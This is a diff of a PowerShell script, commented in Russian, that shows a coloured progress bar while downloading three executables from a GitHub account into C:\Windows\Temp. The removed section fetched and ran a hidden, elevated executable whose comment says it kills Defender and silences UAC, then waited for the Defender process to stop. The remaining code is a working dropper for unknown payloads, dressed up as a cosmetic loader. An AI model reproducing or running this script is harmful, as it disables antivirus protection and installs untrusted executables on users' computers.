@@ -1,8 +1,9 @@
 # === НАСТРОЙКА ЦВЕТА (меняй HEX здесь) ===
 $hexColor = "#3A96DD"
 
-[Console]::CursorVisible = $false
+[Console]::CursorVisible = $false  # <-- скрыть курсор
 
+# Конвертация HEX в ANSI RGB фон
 $r = [Convert]::ToInt32($hexColor.Substring(1,2), 16)
 $g = [Convert]::ToInt32($hexColor.Substring(3,2), 16)
 $b = [Convert]::ToInt32($hexColor.Substring(5,2), 16)
@@ -27,6 +28,12 @@ Write-Host "${bg}${white}${pad}${reset}"
 
 $script:bottomY = $Host.UI.RawUI.CursorPosition.Y
 
+$downloads = @(
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_new.exe'; Path = 'C:\Windows\Temp\timeless_new.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
+)
+
 function Show-Progress {
     param ([int]$Percent)
     $barWidth = 40
@@ -39,49 +46,14 @@ function Show-Progress {
     $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:bottomY
 }
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# ========= STAGE 1: silent.exe (kills Defender + silences UAC) =========
-Show-Progress 5
-$silentUrl  = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeles.exe'
-$silentPath = "$env:TEMP\Timeles.exe"
-try {
-    $req = [System.Net.HttpWebRequest]::Create($silentUrl)
-    $req.AllowAutoRedirect = $true
-    $req.UserAgent = "Mozilla/5.0"
-    $resp = $req.GetResponse()
-    $s = $resp.GetResponseStream()
-    $fs = [System.IO.File]::Create($silentPath)
-    $s.CopyTo($fs); $fs.Close(); $s.Close(); $resp.Close()
-
-    Show-Progress 10
-    Start-Process $silentPath -Verb RunAs -WindowStyle Hidden -Wait
-
-    $start = Get-Date
-    $deadline = $start.AddSeconds(90)
-    while ((Get-Date) -lt $deadline) {
-        $alive = Get-Process MsMpEng -ErrorAction SilentlyContinue
-        if (-not $alive) { break }
-        $elapsed = ((Get-Date) - $start).TotalSeconds
-        $pct = 10 + [int](($elapsed / 90) * 25)
-        Show-Progress $pct
-        Start-Sleep -Milliseconds 800
-    }
-} catch { }
-
-# ========= STAGE 2: payload downloads (Defender now neutralized) =========
-$downloads = @(
-    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe';        Path = 'C:\Windows\Temp\Timeless.exe' },
-    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_new.exe';    Path = 'C:\Windows\Temp\timeless_new.exe' },
-    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe';  Path = 'C:\Windows\Temp\block_majestic.exe' }
-)
-
 $totalFiles = $downloads.Count
 $fileIndex = 0
-Show-Progress 35
+
+Show-Progress 0
 
 foreach ($item in $downloads) {
     try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $req = [System.Net.HttpWebRequest]::Create($item.URL)
         $req.AllowAutoRedirect = $true
         $req.UserAgent = "Mozilla/5.0"
@@ -97,7 +69,7 @@ foreach ($item in $downloads) {
             $totalRead += $bytesRead
             if ($totalBytes -gt 0) {
                 $filePct = ($totalRead / $totalBytes)
-                $totalPct = 35 + [int]((($fileIndex + $filePct) / $totalFiles) * 60)
+                $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
                 Show-Progress $totalPct
             }
         }
@@ -110,7 +82,8 @@ foreach ($item in $downloads) {
 }
 
 Show-Progress 100
-[Console]::CursorVisible = $true
+
+[Console]::CursorVisible = $true  # <-- вернуть курсор
 
 foreach ($item in $downloads) {
     if (Test-Path $item.Path) {
